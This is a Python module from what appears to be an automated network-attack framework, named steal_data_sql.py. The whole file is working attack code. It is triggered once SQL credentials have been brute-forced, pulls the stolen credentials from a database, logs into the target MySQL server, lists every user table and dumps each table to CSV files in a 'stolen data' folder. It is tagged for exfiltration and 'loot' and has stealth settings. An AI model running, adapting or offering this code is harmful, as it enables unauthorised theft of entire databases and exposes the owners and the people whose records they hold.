"""steal_data_sql.py - SQL data exfiltration: enumerate schemas and dump tables to CSV."""

import os
import logging
import time
import csv

from threading import Timer
from typing import List, Tuple, Dict, Optional
from sqlalchemy import create_engine, text
from shared import SharedData
from logger import Logger

logger = Logger(name="steal_data_sql.py", level=logging.DEBUG)

b_class  = "StealDataSQL"
b_module = "steal_data_sql"
b_status = "steal_data_sql"
b_parent = "SQLBruteforce"
b_port   = 3306
b_trigger      = 'on_any:["on_cred_found:sql","on_service:sql"]'
b_requires     = '{"all":[{"has_cred":"sql"},{"has_port":3306},{"max_concurrent":2}]}'
# Scheduling / limits
b_priority     = 60                     # 0..100 (higher processed first in this schema)
b_timeout      = 900                    # seconds before a pending queue item expires
b_max_retries  = 1                      # minimal retries; avoid noisy re-runs
b_cooldown     = 86400                  # seconds (per-host cooldown between runs)
b_rate_limit   = "1/86400"              # at most 3 executions/day per host (extra guard)
# Risk / hygiene
b_stealth_level = 6                     # 1..10 (higher = more stealthy)
b_risk_level    = "high"                # 'low' | 'medium' | 'high'
b_enabled       = 1                     # set to 0 to disable from DB sync
# Tags (free taxonomy, JSON-ified by sync_actions)
b_tags         = ["exfil", "sql", "loot", "db", "mysql"]

class StealDataSQL:
    def __init__(self, shared_data: SharedData):
        self.shared_data = shared_data
        self.sql_connected = False
        self.stop_execution = False
        self._ip_to_identity: Dict[str, Tuple[Optional[str], Optional[str]]] = {}
        self._refresh_ip_identity_cache()
        logger.info("StealDataSQL initialized.")

    # -------- Identity cache (hosts) --------
    def _refresh_ip_identity_cache(self) -> None:
        self._ip_to_identity.clear()
        try:
            rows = self.shared_data.db.get_all_hosts()
        except Exception as e:
            logger.error(f"DB get_all_hosts failed: {e}")
            rows = []
        for r in rows:
            mac = r.get("mac_address") or ""
            if not mac:
                continue
            hostnames_txt = r.get("hostnames") or ""
            current_hn = hostnames_txt.split(';', 1)[0] if hostnames_txt else ""
            ips_txt = r.get("ips") or ""
            if not ips_txt:
                continue
            for ip in [p.strip() for p in ips_txt.split(';') if p.strip()]:
                self._ip_to_identity[ip] = (mac, current_hn)

    def mac_for_ip(self, ip: str) -> Optional[str]:
        if ip not in self._ip_to_identity:
            self._refresh_ip_identity_cache()
        return self._ip_to_identity.get(ip, (None, None))[0]

    def hostname_for_ip(self, ip: str) -> Optional[str]:
        if ip not in self._ip_to_identity:
            self._refresh_ip_identity_cache()
        return self._ip_to_identity.get(ip, (None, None))[1]

    # -------- Credentials (creds table) --------
    def _get_creds_for_target(self, ip: str, port: int) -> List[Tuple[str, str, Optional[str]]]:
        """
        Return list[(user,password,database)] for SQL service.
        Prefer exact IP; also include by MAC if known. Dedup by (u,p,db).
        """
        mac = self.mac_for_ip(ip)
        params = {"ip": ip, "port": port, "mac": mac or ""}

        by_ip = self.shared_data.db.query(
            """
            SELECT "user","password","database"
              FROM creds
             WHERE service='sql'
               AND COALESCE(ip,'')=:ip
               AND (port IS NULL OR port=:port)
            """, params)

        by_mac = []
        if mac:
            by_mac = self.shared_data.db.query(
                """
                SELECT "user","password","database"
                  FROM creds
                 WHERE service='sql'
                   AND COALESCE(mac_address,'')=:mac
                   AND (port IS NULL OR port=:port)
                """, params)

        seen, out = set(), []
        for row in (by_ip + by_mac):
            u = str(row.get("user") or "").strip()
            p = str(row.get("password") or "").strip()
            d = row.get("database")
            d = str(d).strip() if d is not None else None
            key = (u, p, d or "")
            if not u or (key in seen):
                continue
            seen.add(key)
            out.append((u, p, d))
        return out

    # -------- SQL helpers --------
    def connect_sql(self, ip: str, username: str, password: str, database: Optional[str] = None):
        try:
            db_part = f"/{database}" if database else ""
            conn_str = f"mysql+pymysql://{username}:{password}@{ip}:{b_port}{db_part}"
            engine = create_engine(conn_str, connect_args={"connect_timeout": 10})
            # quick test
            with engine.connect() as _:
                pass
            self.sql_connected = True
            logger.info(f"Connected SQL {ip} as {username}" + (f" db={database}" if database else ""))
            return engine
        except Exception as e:
            logger.error(f"SQL connect error {ip} {username}" + (f" db={database}" if database else "") + f": {e}")
            return None



    def find_tables(self, engine):
        """
        Returns list of (table_name, schema_name) excluding system schemas.
        """
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("Table search interrupted.")
                return []
            q = text("""
                SELECT TABLE_NAME, TABLE_SCHEMA
                FROM INFORMATION_SCHEMA.TABLES
                WHERE TABLE_TYPE='BASE TABLE'
                AND TABLE_SCHEMA NOT IN ('information_schema','mysql','performance_schema','sys')
            """)
            with engine.connect() as conn:
                rows = conn.execute(q).fetchall()
            return [(r[0], r[1]) for r in rows]
        except Exception as e:
            logger.error(f"find_tables error: {e}")
            return []


    def steal_data(self, engine, table: str, schema: str, local_dir: str) -> None:
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("Data steal interrupted.")
                return

            q = text(f"SELECT * FROM `{schema}`.`{table}`")
            with engine.connect() as conn:
                result = conn.execute(q)
                headers = result.keys()

                os.makedirs(local_dir, exist_ok=True)
                out = os.path.join(local_dir, f"{schema}_{table}.csv")

                with open(out, "w", newline="", encoding="utf-8") as f:
                    writer = csv.writer(f)
                    writer.writerow(headers)
                    for row in result:
                        writer.writerow(row)

            logger.success(f"Dumped {schema}.{table} -> {out}")
        except Exception as e:
            logger.error(f"Dump error {schema}.{table}: {e}")


    # -------- Orchestrator entry --------
    def execute(self, ip: str, port: str, row: Dict, status_key: str) -> str:
        try:
            self.shared_data.bjorn_orch_status = b_class
            try:
                port_i = int(port)
            except Exception:
                port_i = b_port

            creds = self._get_creds_for_target(ip, port_i)
            logger.info(f"Found {len(creds)} SQL credentials in DB for {ip}")
            if not creds:
                logger.error(f"No SQL credentials for {ip}. Skipping.")
                return 'failed'

            def _timeout():
                if not self.sql_connected:
                    logger.error(f"No SQL connection within 4 minutes for {ip}. Failing.")
                    self.stop_execution = True

            timer = Timer(240, _timeout)
            timer.start()

            mac = (row or {}).get("MAC Address") or self.mac_for_ip(ip) or "UNKNOWN"
            success = False

            for username, password, _db in creds:
                if self.stop_execution or self.shared_data.orchestrator_should_exit:
                    logger.info("Execution interrupted.")
                    break
                try:
                    base_engine = self.connect_sql(ip, username, password, database=None)
                    if not base_engine:
                        continue

                    tables = self.find_tables(base_engine)
                    if not tables:
                        continue

                    for table, schema in tables:
                        if self.stop_execution or self.shared_data.orchestrator_should_exit:
                            logger.info("Execution interrupted.")
                            break
                        db_engine = self.connect_sql(ip, username, password, database=schema)
                        if not db_engine:
                            continue
                        local_dir = os.path.join(self.shared_data.data_stolen_dir, f"sql/{mac}_{ip}/{schema}")
                        self.steal_data(db_engine, table, schema, local_dir)

                    logger.success(f"Stole data from {len(tables)} tables on {ip}")
                    success = True
                    timer.cancel()
                    return 'success'
                except Exception as e:
                    logger.error(f"SQL loot error {ip} {username}: {e}")

            timer.cancel()
            return 'success' if success else 'failed'

        except Exception as e:
            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            return 'failed'
